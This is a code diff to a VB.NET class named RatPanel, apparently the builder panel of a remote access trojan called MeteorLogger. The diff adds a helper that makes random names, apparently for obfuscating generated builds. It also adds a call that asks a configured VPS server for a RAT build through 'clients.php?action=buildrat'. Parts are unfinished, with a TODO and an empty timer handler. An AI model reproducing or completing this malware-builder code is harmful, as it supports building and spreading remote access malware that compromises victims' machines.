@@ -8,6 +8,11 @@ Public Class RatPanel
     Private mainWebClient As New WebClient()
     Private demandsClosing As Boolean = False
 
+    Public Function GetRandomString()
+        Dim p As String = Path.GetRandomFileName()
+        p = p.Replace(".", "")
+        Return p
+    End Function
     Private Sub RatPanel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         ClientListManager.RunWorkerAsync()
@@ -247,8 +252,19 @@ Public Class RatPanel
             FileClose(2)
 #End Region
 
+
+            Dim randomnamespace As String = GetRandomString()
+            Dim randomdownloadstringname As String = GetRandomString()
+            Dim randomstringdownload As String = GetRandomString()
+            Dim randomdownloadername As String = GetRandomString()
+            '  Dim namespace As String = GetRandomString()
+            Dim exename = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=buildrat")
+
+            ' TODO
+
             AddLogMessage("Built !")
             'MsgBox("Your RAT was saved successfully !", MsgBoxStyle.Information, "Success - MeteorLogger")
+
         End If
     End Sub
 
@@ -261,6 +277,10 @@ Public Class RatPanel
 
     Private Sub Button1_Click(sender As Object, e As EventArgs)
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
+    End Sub
+
+    Private Sub ClientListTimer_Tick(sender As Object, e As EventArgs) Handles ClientListTimer.Tick
+
     End Sub
 
 
